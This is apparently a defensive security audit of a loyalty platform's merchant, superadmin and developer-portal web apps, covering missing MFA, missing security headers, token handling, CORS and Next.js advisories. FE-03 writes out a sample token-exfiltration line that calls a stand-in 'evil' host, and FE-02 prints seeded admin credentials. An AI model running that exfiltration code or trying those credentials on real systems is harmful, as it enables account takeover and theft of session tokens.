# 06 — Frontend consoles & developer portal

Audit date: 2026-10-10. Branch `main` @ afc3fe2. Read-only review of `apps/web-brand` (merchant console, `platform.partnerspoints.ae`), `apps/web-superadmin` (internal console, `superadmin.platform.partnerspoints.ae`) and `apps/docs` (partner developer portal, `developers.partnerspoints.ae`). All three are Next.js 15 App Router apps deployed on Vercel. No requests were made to production hostnames; versions were taken from `pnpm-lock.yaml` / `node_modules`, advisories from `pnpm audit --prod --json` (registry query only).

Installed versions (lockfile): `next@15.5.19`, `react@19.2.7` (consoles) / `react@19.1.0` (docs), `recharts@2.15.4`, `lucide-react@0.468.0`, `qrcode@1.5.4`, `marked@15.0.12`, `shiki@3.23.0`.

## Summary

| Severity | Count | IDs |
|---|---|---|
| Critical | 0 | — |
| High | 2 | FE-01, FE-02 |
| Medium | 6 | FE-03, FE-04, FE-05, FE-06, FE-07, FE-08 |
| Low | 5 | FE-09, FE-10, FE-11, FE-12, FE-13 |
| Info | 3 | FE-14, FE-15, FE-16 |

Architecture facts that frame everything below:

- Both consoles are pure client-rendered SPAs (`'use client'` on every page). There is **no** `middleware.ts`, **no** `app/api`, **no** server actions, **no** `headers()` in `next.config.mjs`, and `vercel.json` only sets build/install commands. All authorization is done by the API; the consoles only hide nav items.
- Auth: `POST /v1/auth/login` returns `{accessToken, refreshToken, expiresIn}`; the consoles keep **only** `accessToken` in `localStorage` (`rfm_token` / `rfm_sa_token`) and discard the refresh token. Sessions therefore last at most `JWT_ACCESS_TTL_SECONDS` (900 s) and the user is bounced to `/login` on the first 401.
- The docs portal is the only app with server code: an Edge `middleware.ts` gate, two Edge route handlers (`/api/access`, `/api/logout`), a static `openapi.json` route and build-time Markdown rendering via `marked` + `shiki`. Content is 100 % repo-controlled; nothing user- or API-sourced is rendered as HTML.

---

## Findings

### FE-01 — MFA cannot be used on either console; superadmin runs password-only

- **Severity:** High — **CVSS 3.1:** 7.4 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
- **Confidence:** Confirmed
- **Location:** `apps/web-superadmin/app/login/page.tsx:20-25`, `apps/web-brand/app/login/page.tsx:20-25`; no caller of `/auth/mfa`, `/auth/mfa/enrol`, `/auth/mfa/confirm` anywhere under `apps/web-*` (grep `mfa|totp` → only the two login pages and the Team page's read-only "MFA" column).
- **Evidence:**
  ```tsx
  // apps/web-superadmin/app/login/page.tsx:20-25 (identical in web-brand)
  if (r.accessToken) {
    setToken(r.accessToken);
    router.push('/');
  } else if (r.mfaRequired) {
    setError('MFA is enabled for this account (not wired in this demo UI).');
  }
  ```
  The API supports a TOTP second step (`apps/api/src/auth/controllers/admin-auth.controller.ts:28-34` `POST /auth/mfa`, `:49-62` enrol/confirm) and `docs/security.md:6` advertises "email + password (argon2id) + TOTP MFA". The consoles implement neither the verification step nor enrolment, and the Team pages (`apps/web-superadmin/app/(app)/team/page.tsx:63`) only *display* an MFA badge.
- **Impact:** Every platform superadmin and brand admin is protected by a password alone on an internet-facing console. Any admin who enables MFA through the API is locked out of both consoles, which guarantees nobody turns it on. Combined with FE-02 (published demo credentials) and the absence of account lockout beyond a 10/min throttle, credential stuffing or a single phished password yields full control of wallets, vouchers, act-as, terminal keys and APK releases.
- **Exploit scenario:** Attacker obtains a superadmin password (phish, reuse from a breach, FE-02 defaults). Logs in at the superadmin console; no second factor is ever requested. Tops up a merchant wallet, issues vouchers to a controlled customer, or publishes a terminal release.
- **Fix:**
  1. Login pages: when `r.mfaRequired`, render a 6-digit code field and call `POST /auth/mfa` with `{email, password, code}`; store the returned `accessToken`.
  2. Settings page (both consoles): "Enable two-factor" flow calling `POST /auth/mfa/enrol` (render the `otpauth` URI with the already-installed `qrcode` package in superadmin; add it to web-brand) then `POST /auth/mfa/confirm`.
  3. Server-side (cross-ref 02): make `totpEnabled` mandatory for `platform_superadmin` / `platform_support` and for `brand_admin`; reject login for those roles when it is false after a grace period.
  4. Remove the string "not wired in this demo UI" from production code.
- **Effort:** M

### FE-02 — Production login pages pre-fill and print the seeded demo credentials

- **Severity:** High — **CVSS 3.1:** 8.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` (becomes 9.8 if the seeded accounts exist in the production database)
- **Confidence:** Confirmed for the UI; **Needs verification** that `superadmin@rfm-loyalty.dev` / `admin@camel-bean.dev` do not exist in the production DB.
- **Location:** `apps/web-superadmin/app/login/page.tsx:9-10, 75-77`; `apps/web-brand/app/login/page.tsx:9-10, 88-90`; `packages/db/prisma/seed.ts:16, 124`.
- **Evidence:**
  ```tsx
  // apps/web-superadmin/app/login/page.tsx:9-10
  const [email, setEmail] = useState('superadmin@rfm-loyalty.dev');
  const [password, setPassword] = useState('ChangeMe123!');
  // :75-77
  Demo: <span className="font-mono">superadmin@rfm-loyalty.dev</span> / <span className="font-mono">ChangeMe123!</span>
  ```
  ```ts
  // packages/db/prisma/seed.ts:16
  const DEMO_PASSWORD = 'ChangeMe123!';
  // :124
  const superadmin = await makeUser('superadmin@rfm-loyalty.dev', 'RFM Superadmin');
  ```
  The seed has no `NODE_ENV === 'production'` guard, and `docs/deployment.md:14` describes the Supabase owner URL as being "for migrations/seed". The same credentials are repeated in `README.md:37-38`, `docs/phase-7-status.md:25-26`, and as Swagger examples in `apps/api/src/auth/dto/admin-auth.dto.ts:5,9`.
- **Impact:** The production sign-in page tells every visitor the platform superadmin's email and the seed password. If the seed was ever run against Supabase (or any admin kept `ChangeMe123!`), this is an unauthenticated platform takeover. Even if not, it hands attackers a confirmed superadmin username and the password pattern for all invited users (temp passwords are shown once in the Team modal and "should" be changed; there is no forced rotation).
- **Exploit scenario:** Visitor opens `superadmin.platform.partnerspoints.ae/login`, clicks "Sign in" with the pre-filled form. If the seed ran: logged in as platform superadmin with no MFA (FE-01).
- **Fix:** Remove the `useState` defaults and the "Demo:" paragraph from both login pages (ship empty fields). Add to `seed.ts`: `if (process.env.NODE_ENV === 'production' && process.env.ALLOW_DEMO_SEED !== 'true') throw new Error('refusing to seed demo data in production')`. Verify in production: `select email from user_account where email in ('superadmin@rfm-loyalty.dev','admin@camel-bean.dev')` and disable/rotate if present. Force a password change on first login for invited users (API side).
- **Effort:** S

### FE-03 — No security headers on either console (no CSP, framing, referrer, permissions or MIME-sniff protection)

- **Severity:** Medium — **CVSS 3.1:** 4.2 `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N`
- **Confidence:** Confirmed
- **Location:** `apps/web-brand/next.config.mjs:1-14`, `apps/web-superadmin/next.config.mjs:1-14`, `apps/web-brand/vercel.json`, `apps/web-superadmin/vercel.json` (no `headers` key in any of them).
- **Evidence:**
  ```js
  // apps/web-superadmin/next.config.mjs (whole config; identical in web-brand)
  const nextConfig = {
    reactStrictMode: true,
    eslint: { ignoreDuringBuilds: true },
    outputFileTracingRoot: join(here, '..', '..'),
  };
  ```
  Compare `apps/docs/next.config.mjs:15-27`, which does set `X-Robots-Tag`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin` (but still no CSP or Permissions-Policy). Vercel adds `Strict-Transport-Security: max-age=63072000` by default; nothing else.
- **Impact:** No defence in depth for the one asset that matters here (FE-05: bearer token in `localStorage`). A single injected script, a compromised npm dependency, or a malicious browser extension on the superadmin's machine exfiltrates the token to any origin with no CSP `connect-src` to stop it. The superadmin console is also indexable by search engines (no `X-Robots-Tag`, no `robots.ts`).
- **Exploit scenario:** Supply-chain compromise of a client-side dependency (`recharts`, `lucide-react`, `qrcode` …) ships `fetch('https://evil/?t='+localStorage.rfm_sa_token)`. With no CSP it succeeds silently.
- **Fix:** Add to both `next.config.mjs` (and mirror in `vercel.json` if you prefer platform-level):
  ```js
  async headers() {
    const api = 'https://api.partnerspoints.ae';
    const csp = [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",          // see note: replace with nonce + 'strict-dynamic' via middleware
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data: blob:",                 // data: needed for the terminal-key QR in superadmin
      `connect-src 'self' ${api}`,
      "frame-ancestors 'none'",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      'upgrade-insecure-requests',
    ].join('; ');
    return [{
      source: '/:path*',
      headers: [
        { key: 'Content-Security-Policy', value: csp },
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'no-referrer' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()' },
        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
        { key: 'X-Robots-Tag', value: 'noindex, nofollow, noarchive' },   // superadmin at minimum
        { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
      ],
    }];
  }
  ```
  Next.js App Router injects inline bootstrap scripts, so `script-src` needs either `'unsafe-inline'` (shown) or, better, a per-request nonce generated in a small `middleware.ts` and passed via the `x-nonce` header with `'strict-dynamic'`. Self-host the two Google Fonts (`next/font/google`) to drop the two external origins from the policy. Add `app/robots.ts` returning `disallow: '/'` to the superadmin console.
- **Effort:** S (headers) / M (nonce-based CSP)

### FE-04 — Superadmin "act-as" token is passed to the brand console in the URL query string

- **Severity:** Medium — **CVSS 3.1:** 6.5 `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N`
- **Confidence:** Confirmed
- **Location:** `apps/web-superadmin/lib/api.ts:404-410`; `apps/web-brand/app/act/page.tsx:10-18`; `apps/api/src/modules/superadmin/superadmin.service.ts:116-141`.
- **Evidence:**
  ```ts
  // apps/web-superadmin/lib/api.ts:407-410
  export async function manageBrand(brandId: string): Promise<void> {
    const { token } = await actAsBrand(brandId);
    window.open(`${BRAND_CONSOLE_URL}/act?token=${encodeURIComponent(token)}`, '_blank', 'noopener');
  }
  ```
  ```tsx
  // apps/web-brand/app/act/page.tsx:11-14
  const token = new URLSearchParams(window.location.search).get('token');
  if (token) { setToken(token); router.replace('/'); }
  ```
  The token is a full brand-admin access JWT with `elevated: true` and `onBehalfOf` (`superadmin.service.ts:124-139`), valid for 900 s, which bypasses governance locks. It travels as a query string, so it is written to Vercel request/edge logs for `platform.partnerspoints.ae`, to browser history (`router.replace` only rewrites the entry after the page has already been recorded and the `window.open` target URL is retained by the browser's new-tab history), to any proxy logs, and to the clipboard if the operator copies the address bar. The `ImpersonationSession` row (`schema.prisma:442-454`) has `endedAt` but nothing ever sets it, so the session cannot be ended early.
- **Impact:** Anyone with Vercel log access (team members, log drains, support), or with access to the operator's browser history, can replay an elevated brand-admin token for up to 15 minutes and change governance-locked program configuration, export/erase customers, or issue terminal API keys for that brand.
- **Exploit scenario:** Log drain or Vercel dashboard viewer copies `/act?token=eyJ…` from the request log within 15 minutes, sets `localStorage.rfm_token` on `platform.partnerspoints.ae`, and acts as the brand with `elevated: true`.
- **Fix (minimal, S):** Move the token to the URL fragment: `window.open(`${BRAND_CONSOLE_URL}/act#token=…`)` and read `new URLSearchParams(window.location.hash.slice(1))`, then `history.replaceState(null, '', '/act')` before `router.replace('/')`. Fragments are never sent to the server or logged.
  **Fix (proper, M):** Have `POST /admin/brands/:id/act-as` return a single-use, 60-second handoff code stored server-side; `/act?code=…` exchanges it via `POST /auth/act-as/exchange` for the token. Set `ImpersonationSession.endedAt` on exchange expiry/explicit "Stop managing" and add that button to the brand console header when `onBehalfOf` is set.
- **Effort:** S / M

### FE-05 — Access tokens held in `localStorage`; no httpOnly option, no CSP to contain token theft

- **Severity:** Medium — **CVSS 3.1:** 6.8 `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N`
- **Confidence:** Confirmed (design); no exploitable XSS sink was found (see Positive controls)
- **Location:** `apps/web-brand/lib/api.ts:5-13`, `apps/web-superadmin/lib/api.ts:5-13`.
- **Evidence:**
  ```ts
  // apps/web-superadmin/lib/api.ts:5-10
  export function getToken(): string | null {
    return typeof window !== 'undefined' ? window.localStorage.getItem('rfm_sa_token') : null;
  }
  export function setToken(t: string): void { window.localStorage.setItem('rfm_sa_token', t); }
  ```
  The refresh token returned by `/auth/login` (`apps/api/src/auth/auth.service.ts:51-55, 328`) is **not** stored by either console (typed but unused in `web-brand/lib/api.ts:119`; not even typed in superadmin `:70`). No MFA step token exists (FE-01). No `document.referrer` or `document.cookie` use with the token; `window.location.href` is only ever set to the constant `/login` (`api.ts:48`/`:27`).
- **Impact:** Any script executing on the console origin (XSS, compromised dependency, malicious extension, devtools on a shared machine) reads the token synchronously and has full API authority of that user, superadmin included. Exposure window is 15 min per token but the attacker can keep the victim's tab alive and re-steal after each login. The 15-minute hard session (no refresh) is itself a usability pressure that will push someone to raise `JWT_ACCESS_TTL_SECONDS`, which would widen this directly.
- **Exploit scenario:** See FE-03. Alternatively, a brand admin's reporting page renders a customer-supplied string through a future component that uses `dangerouslySetInnerHTML`; the payload posts `localStorage.rfm_token` to an attacker.
- **Fix:** Preferred: a thin BFF in each console (`app/api/auth/*` route handlers) that performs login/refresh against the API and sets `__Host-rfm_session` (`httpOnly; Secure; SameSite=Lax; Path=/`), with the console calling its own `/api/*` proxy; add a CSRF token or `Origin` check on mutating proxy routes. Minimum: keep the access token in memory only (module variable), store the refresh token nowhere in the browser (keep today's "no refresh" behaviour), and ship the CSP from FE-03 so exfiltration is blocked. Never raise the access TTL to compensate.
- **Effort:** L (BFF) / S (memory + CSP)

### FE-06 — API CORS reflects any origin with `credentials: true` in production (`CORS_ORIGINS` not deployed)

- **Severity:** Medium (Low for the consoles alone; raised because it removes the only browser-side barrier once a token leaks per FE-04/FE-05) — **CVSS 3.1:** 3.7 `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Confidence:** Confirmed (config); cross-reference agent 02 for API-side rating
- **Location:** `apps/api/src/main.ts:42-48`; `.do/app.yaml:24-54` (env list for the `api` service).
- **Evidence:**
  ```ts
  // apps/api/src/main.ts:44-48
  const corsOrigins = (process.env.CORS_ORIGINS ?? '').split(',').map((s) => s.trim()).filter(Boolean);
  app.enableCors({ origin: corsOrigins.length ? corsOrigins : true, credentials: true });
  ```
  `CORS_ORIGINS` does not appear in `.do/app.yaml`, `DEPLOYMENT.md` or `docs/deployment.md`. The consoles never use `credentials: 'include'` (all `fetch` calls in `lib/api.ts` send only `Authorization`), and the API sets no cookies, so there is no cookie-based CSRF today.
- **Impact:** Any web origin can issue credentialed cross-origin requests to `api.partnerspoints.ae`. With bearer auth this does not by itself leak a session, but it means a stolen token is usable from any page, unauthenticated endpoints (`/v1/customer/auth/otp`, `/v1/r/:token`, `/v1/customer/app-status`) can be driven from third-party sites, and any future move to cookie sessions (FE-05 fix) would become immediately CSRF-exploitable.
- **Fix:** Add `CORS_ORIGINS=https://platform.partnerspoints.ae,https://superadmin.platform.partnerspoints.ae` to `.do/app.yaml` for the `api` service; make `main.ts` refuse to start in production when the list is empty. Keep `credentials: true` only if cookies are introduced.
- **Effort:** S

### FE-07 — `next@15.5.19` is behind the patched line (`>=15.5.27`); two Critical advisories in the installed version

- **Severity:** Medium (contextual; advisory ratings are Critical/High) — **CVSS 3.1:** 8.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` contextual; GHSA-2xp9-vwfh-vxw4 is rated 9.8 upstream
- **Confidence:** Confirmed version; **Needs verification** of reachability on Vercel
- **Location:** `pnpm-lock.yaml:5772` (`next@15.5.19`), all three apps resolve to it.
- **Evidence:** `pnpm audit --prod --json` filtered to `apps__web-brand>`, `apps__web-superadmin>`, `apps__docs>` paths:

  | Advisory | Title | Fixed in | Applies here? |
  |---|---|---|---|
  | GHSA-2xp9-vwfh-vxw4 (Critical) | Unauthenticated RCE in Image Optimization API via AVIF | 15.5.24 | Needs verification. On Vercel, `/_next/image` is served by the platform optimizer, not the Next server, so the vulnerable path is probably not reachable. `apps/docs` is the only app using `next/image` (`app/(portal)/layout.tsx:14`, `app/access/page.tsx:20`). |
  | GHSA-p293-qw3h-jr36 (Critical) | Unauthenticated RCE on Windows-hosted servers | 15.5.24 | No (Linux on Vercel) |
  | GHSA-4jqv-mc3x-m676, GHSA-mcj8-r9mp-w47p (Moderate) | SSG/ISR cache poisoning, cross-user content substitution | 15.5.27 | Stated as self-hosted only; docs portal uses `force-static` pages behind middleware — verify |
  | GHSA-p9j2-gv94-2wf4 (High) | SSRF in rewrites via attacker-controlled destination | 15.5.21 | No (no `rewrites()` configured) |
  | GHSA-m99w-x7hq-7vfj, GHSA-89xv-2m56-2m9x, GHSA-4c39-4ccg-62r3, GHSA-955p-x3mx-jcvp | Server Actions DoS / SSRF / unbounded payload / endpoint disclosure | 15.5.21 | No server actions in any app (grep `'use server'` → none) |
  | GHSA-68g3-v927-f742, GHSA-4633-3j49-mh5q (Moderate) | Cache confusion for requests with bodies | 15.5.21 | Low; consoles have no server routes |
  | GHSA-q8wf-6r8g-63ch (Moderate) | Image Optimization DoS with SVG | 15.5.21 | Same as AVIF note |
  | `sharp` (<0.35.5, High, libvips/libheif/librsvg), `postcss` (<8.5.23, High), `nanoid`, `source-map-js` | build-time / image deps of `next` in `apps/docs` | — | Build-time only except `sharp` at runtime for `next/image` if self-hosted |

  CVE-2025-29927 (middleware auth bypass, `x-middleware-subrequest`) is **fixed** in this version (`>=15.2.3`); it would otherwise have fully bypassed the docs gate. React2Shell-class RSC advisories (fixed in 15.5.7+) are also covered.
- **Impact:** If the Next image optimizer is reachable on any of the three deployments, an unauthenticated AVIF upload is remote code execution on the portal/console host. Otherwise the residual is cache-poisoning and DoS paths that are mostly inapplicable to CSR-only consoles.
- **Fix:** Bump `next` to `^15.5.27` (or 15.6.x) across the workspace and `react`/`react-dom` to one version (consoles 19.2.7, docs 19.1.0 today). Add `images: { unoptimized: true }` or `images.formats: ['image/webp']` to the two consoles (they use `<img>` anyway) to remove the optimizer surface entirely. Add `pnpm audit --prod --audit-level=high` to `.github/workflows/ci.yml` (system map notes there is no SCA step).
- **Effort:** S

### FE-08 — Developer-portal access codes can be brute-forced; fixed delay is the only control

- **Severity:** Medium — **CVSS 3.1:** 5.3 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Confidence:** Confirmed
- **Location:** `apps/docs/app/api/access/route.ts:12-20`; `apps/docs/lib/auth.ts:19-34, 82-86`; `apps/docs/.env.example:4`.
- **Evidence:**
  ```ts
  // apps/docs/app/api/access/route.ts:13-15
  if (!label) {
    // A small fixed delay makes brute force impractical without needing state.
    await new Promise((r) => setTimeout(r, 600));
  ```
  ```ts
  // apps/docs/lib/auth.ts:29
  if (/^[a-z0-9-]{1,32}$/.test(label) && code.length >= 8) out.push({ label, code });
  ```
  The delay is per request and the route runs on the Edge runtime with unbounded concurrency, so it does not limit attempts per second. There is no counter, no lockout, no CAPTCHA, no IP throttle. Codes are operator-chosen with an 8-character floor and the committed example is `till=change-me`. A successful code yields a 30-day session (`SESSION_DAYS = 30`, `auth.ts:12`) that can only be revoked by deleting the partner label from the env (`verifySession`, `auth.ts:97`).
- **Impact:** The portal is a confidentiality boundary for partner API docs, HMAC canonicalisation details, error codes and the terminal OpenAPI file. A dictionary attack at a few hundred requests per second from a few IPs finds weak codes in minutes; the session then persists for 30 days.
- **Exploit scenario:** Attacker posts `code=<candidate>` to `/api/access` with 200 concurrent connections; each attempt costs them 600 ms of latency but nothing else.
- **Fix:** Enforce code strength at generation (≥ 20 random chars, generated by the operator tooling, not typed). Add real rate limiting: Vercel WAF rate-limit rule on `POST /api/access` (e.g. 10/min/IP), or a KV-backed counter keyed by IP + label with exponential backoff. Lower `SESSION_DAYS` to 7 and add a `jti`/issued-at in the cookie so sessions can be invalidated by a "not-before" timestamp per label. Remove `till=change-me` from `.env.example` in favour of a placeholder that fails the length check.
- **Effort:** S

### FE-09 — Portal cookie-signing secret falls back to the access codes themselves

- **Severity:** Low — **CVSS 3.1:** 3.1 `AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N`
- **Confidence:** Confirmed (code); **Needs verification** whether `DOCS_COOKIE_SECRET` is set on Vercel (it is absent from `DEPLOYMENT.md` / `docs/deployment.md`).
- **Location:** `apps/docs/lib/auth.ts:36-42`.
- **Evidence:**
  ```ts
  function signingSecret(): string {
    const explicit = process.env.DOCS_COOKIE_SECRET?.trim();
    if (explicit) return explicit;
    return 'derived:' + accessCodes().map((c) => `${c.label}=${c.code}`).join('|');
  }
  ```
- **Impact:** With a single partner configured, the HMAC key is `derived:till=<that partner's code>`. The partner (or anyone who learned the code) can mint their own `v1.<label>.<exp>` cookies with arbitrary expiry, surviving the intended expiry window; label removal still revokes them, so impact is bounded to persistence.
- **Fix:** Require `DOCS_COOKIE_SECRET` (fail the build or `middleware` with a clear error when unset in production) and document it in `DEPLOYMENT.md`. Bind the session to a server-side issued-at and reject sessions issued before a per-label `revokedBefore` timestamp.
- **Effort:** S

### FE-10 — Consoles can be framed (no `frame-ancestors` / `X-Frame-Options`); high-impact actions have no re-auth or confirm step

- **Severity:** Low — **CVSS 3.1:** 3.5 `AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`
- **Confidence:** Confirmed (header absence); exploitability Likely low in current browsers
- **Location:** `apps/web-superadmin/next.config.mjs` (no headers); `apps/web-superadmin/components/merchant-detail.tsx:227-250` (`TopUpModal` — single "Credit wallet" click, no confirmation); `apps/web-superadmin/app/(app)/customers/[personId]/page.tsx:530` (`issueVoucher`); `apps/web-superadmin/app/(app)/brands/page.tsx:31` (`manageBrand`).
- **Evidence:** No `frame-ancestors` or `X-Frame-Options` is emitted for either console (FE-03). `TopUpModal` posts `topUpWallet(g.id, { amountMinor, currency, idempotencyKey })` directly from the modal button. `ConfirmDialog` exists but is used only for suspend/delete/revoke flows (`merchant-detail.tsx:120`, `team/page.tsx:77`, `locations/page.tsx:201`, `vouchers/page.tsx:115`).
- **Why Low:** The session lives in `localStorage`, and Chrome ≥115, Firefox ≥103 (Total Cookie Protection) and Safari partition third-party `localStorage` by top-level site. A console framed on `evil.example` therefore sees an empty store and renders the login page, which defeats classic clickjacking. Legacy or enterprise-configured browsers without storage partitioning remain exposed.
- **Fix:** The `frame-ancestors 'none'` + `X-Frame-Options: DENY` headers in FE-03. Independently of framing, require a typed confirmation (amount re-entry) for wallet top-ups and a `ConfirmDialog` for voucher issue and act-as, and have the API require a fresh-auth (`auth_time` < 5 min) or MFA re-prompt for `group.wallet.manage` and terminal-release publishing (cross-ref 02).
- **Effort:** S

### FE-11 — Authorization in the UI is nav-filtering only; roles never gate actions client-side

- **Severity:** Low (UX / least-surprise; security relies entirely on the API) — **CVSS 3.1:** 0.0 n/a (informational control-design note)
- **Confidence:** Confirmed
- **Location:** `apps/web-brand/components/sidebar.tsx:63-71`; `apps/web-brand/lib/api.ts:507`; `apps/api/src/modules/loyalty-rules/manage.controller.ts:308-313`; `apps/api/src/modules/loyalty-rules/loyalty.service.ts:569-574`.
- **Evidence:**
  ```tsx
  // apps/web-brand/components/sidebar.tsx:69-71
  const groups = NAV_GROUPS
    .map((g) => ({ ...g, items: g.items.filter((item) => !item.module || access[item.module] !== false) }))
  ```
  ```ts
  // apps/api/src/modules/loyalty-rules/manage.controller.ts:308-311
  // ── module entitlements (read-only; superadmin controls) ──
  @Get('modules') ... summary: 'This brand’s module entitlements (drives console nav).'
  ```
  The role checks done in the UI are: (a) brand-console nav hidden per `moduleAccess` flag; (b) nothing else — there is no decode of the JWT, no `roles`/`elevated` awareness, and every page renders every button for every role (`analyst_readonly`, `brand_manager` included). `/manage/modules` is informational; no API guard was found that enforces `moduleAccess` (grep `assertModule|requireModule|ModuleGuard|hasModule` → none), so a brand with `partnerships: false` can still call `/v1/manage/lulu/*` if its role permits. **Needs verification** by agent 02 whether that is intended.
- **Impact:** None directly; the API's `PermissionsGuard` is the real control. Listing here so nobody mistakes the nav filter for an entitlement check, and so the UX gap (read-only users see editable forms that fail with 403) is tracked.
- **Fix:** Decode the access-token claims client-side (roles, `elevated`, `onBehalfOf`) to hide/disable actions and show an "Managing as <brand> on behalf of superadmin" banner; enforce `moduleAccess` in the API where modules are meant to be paid entitlements.
- **Effort:** S (UI) / M (API)

### FE-12 — Sign-out does not revoke server-side; token survives in other tabs until next request

- **Severity:** Low — **CVSS 3.1:** 2.6 `AV:P/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`
- **Confidence:** Confirmed
- **Location:** `apps/web-brand/components/sidebar.tsx:129`, `apps/web-superadmin/components/sidebar.tsx:105`; `apps/api/src/auth/controllers/admin-auth.controller.ts:43-47`.
- **Evidence:**
  ```tsx
  onSignOut={() => { clearToken(); router.push('/login'); }}
  ```
  `POST /auth/logout` takes a `refreshToken` and revokes only that row; the consoles never stored one, so there is nothing to revoke and the endpoint is never called. The access token stays valid for the rest of its 900 s. Other open tabs keep their in-memory React state until they issue a request (then 401 → `/login`, `api.ts:46-49`). No `storage` event listener exists, so a tab left open after sign-out on a shared machine still shows data.
- **Impact:** Shared-workstation scenario: a superadmin signs out, walks away, the token in a stale tab or in memory is usable for up to 15 minutes.
- **Fix:** Add a server-side access-token denylist keyed by `sid`/`jti` on logout (cross-ref 02; `PermissionsGuard` currently never re-checks the DB), call it from `onSignOut`, and add `window.addEventListener('storage', …)` to bounce other tabs when `rfm_*_token` is removed.
- **Effort:** S

### FE-13 — Build hardening: lint skipped on all three apps; two React versions in one deploy

- **Severity:** Low — **CVSS 3.1:** n/a
- **Confidence:** Confirmed
- **Location:** `apps/*/next.config.mjs:9` `eslint: { ignoreDuringBuilds: true }` (all three); `pnpm-lock.yaml:6423-6427` (`react@19.1.0` and `react@19.2.7`).
- **Evidence:** Lint (including `@next/next` security rules such as `no-img-element` already disabled inline at `login/page.tsx:39`) does not run in `next build`. CI (`.github/workflows/ci.yml`) does run `lint`, so this is a Vercel-build gap, not a total one. `typescript.ignoreBuildErrors` is **not** set (good). `productionBrowserSourceMaps` is **not** set, so no source maps ship (good). `reactStrictMode: true` (good).
- **Fix:** Remove `ignoreDuringBuilds` once lint is clean; pin `react`/`react-dom` to one version across the workspace.
- **Effort:** S

### FE-14 — Portal `/api/access` and `/api/logout` have no CSRF token (login-CSRF / logout-CSRF only)

- **Severity:** Info
- **Confidence:** Confirmed
- **Location:** `apps/docs/app/api/access/route.ts:7-37`, `apps/docs/app/api/logout/route.ts:7-15`, `apps/docs/app/access/page.tsx:27`.
- **Evidence:** Plain HTML `<form method="post">`; handlers check neither `Origin` nor a token. The session cookie is `SameSite=Lax`, so a cross-site POST to `/api/logout` does not carry it (no logout-CSRF). A cross-site POST to `/api/access` with a code the attacker already holds would log the victim in as that partner label (login-CSRF) — no useful effect because the portal has no per-user state.
- **Fix:** Check `Origin`/`Sec-Fetch-Site` in both handlers (one line each). Low priority.
- **Effort:** S

### FE-15 — Cross-origin Google Fonts stylesheet on all three apps

- **Severity:** Info
- **Location:** `apps/web-brand/app/layout.tsx:18-24`, `apps/web-superadmin/app/layout.tsx:18-24`, `apps/docs/app/layout.tsx:19-24`.
- **Evidence:** `<link href="https://fonts.googleapis.com/css2?…" rel="stylesheet">` with `preconnect` to `fonts.gstatic.com`. A stylesheet cannot run script, but it forces `style-src`/`font-src` exceptions in any CSP (FE-03), leaks superadmin IPs/UA to Google on every page load, and is a third-party availability dependency for the login page.
- **Fix:** `next/font/google` (self-hosted at build time) and drop the `<link>` tags.
- **Effort:** S

### FE-16 — Terminal HMAC secret and provisioning QR rendered on screen; `/act` lands on a token-swapping page

- **Severity:** Info
- **Location:** `apps/web-superadmin/app/(app)/brands/[id]/locations/page.tsx:37-41` (`QRCode.toDataURL(JSON.stringify(issued.provisioning))`); `apps/web-brand/app/(app)/api-keys/page.tsx:74-82`; `apps/web-brand/app/act/page.tsx`.
- **Evidence:** Expected behaviour (secret shown once), noted for screen-sharing/shoulder-surfing risk and because the provisioning payload embeds `NEXT_PUBLIC_TERMINAL_API_BASE` from the build (default `https://api.partnerspoints.ae/v1/terminal`), so a preview deployment with a different value would provision terminals against the wrong host. Also: `/act` silently **replaces** an existing brand-admin session in the same browser profile with the superadmin's elevated token and shows no "acting as" indicator afterwards.
- **Fix:** Mask the secret until "Reveal", auto-dismiss after copy; show an impersonation banner (see FE-11).
- **Effort:** S

---

## Not assessed

- **Vercel project settings** (Deployment Protection / Vercel Authentication on preview deployments, password protection, trusted IPs, log drains, WAF rate-limit rules, environment-variable scoping of `NEXT_PUBLIC_API_URL` / `NEXT_PUBLIC_BRAND_URL` / `DOCS_*` per environment, whether `DOCS_COOKIE_SECRET` is set). Nothing in the repo configures these; only `.vercel/project.json` (untracked, docs project `partners-points-developers`) exists locally. Preview deployments of the superadmin console being reachable by anyone with the URL is therefore **unknown** and should be checked in the dashboard (Settings → Deployment Protection → "Standard Protection" at minimum).
- **Whether the demo seed was ever run against the production database** (FE-02) — requires a read query against Supabase, which was out of scope.
- **Reachability of the Next.js image optimizer on Vercel** for FE-07; verify with a harmless request to `/_next/image?url=/icon.png&w=64&q=75` on each production host and inspect the `server`/`x-vercel-cache` headers (not done: production requests were prohibited).
- **Runtime behaviour** of the consoles (no browser session was run against local builds); findings are from source only.
- **API-side authorization** behind the UI (agent 02): module-entitlement enforcement (FE-11), fresh-auth for money moves (FE-10), access-token revocation on logout (FE-12), MFA enforcement by role (FE-01), CORS rating (FE-06).

## Positive controls verified

